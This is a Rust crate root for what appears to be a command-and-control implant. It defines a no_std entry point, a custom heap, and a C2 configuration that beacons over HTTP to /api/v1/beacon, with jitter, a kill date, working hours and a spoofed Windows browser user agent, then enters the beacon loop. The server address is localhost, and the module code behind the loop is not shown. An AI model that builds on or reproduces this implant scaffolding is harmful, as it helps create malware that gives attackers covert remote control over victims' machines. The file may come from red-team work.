#![cfg_attr(not(any(test, feature = "std")), no_std)]
#![cfg_attr(not(any(test, feature = "std")), no_main)]
#![allow(clippy::missing_safety_doc)]
#![allow(clippy::result_unit_err)]
#![allow(clippy::new_without_default)]
#![allow(clippy::empty_loop)]
#![allow(clippy::manual_range_contains)]
#![allow(clippy::ptr_eq)]
#![allow(clippy::unnecessary_cast)]
#![allow(clippy::needless_range_loop)]
#![allow(clippy::collapsible_if)]

#[cfg(any(test, feature = "std"))]
extern crate std;

extern crate alloc;

pub mod c2;
pub mod modules;
pub mod utils;

// Global Allocator
#[cfg(not(any(test, feature = "std")))]
#[global_allocator]
static ALLOCATOR: utils::heap::MiniHeap = utils::heap::MiniHeap::new(0x10000000, 1024 * 1024);

#[cfg(not(any(test, feature = "std")))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

#[cfg(not(any(test, feature = "std")))]
#[no_mangle]
pub extern "C" fn _start() -> ! {
    // 1. Initialize
    // utils::api_resolver::init();

    let config = c2::C2Config {
        transport: c2::TransportType::Http,
        server_addr: "127.0.0.1",
        sleep_interval: 5000,
        jitter: 10,
        kill_date: 0,
        working_hours: (0, 0),
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        uri: "/api/v1/beacon",
        host_header: "",
    };

    // 2. Enter C2 Loop
    c2::run_beacon_loop(config);
}
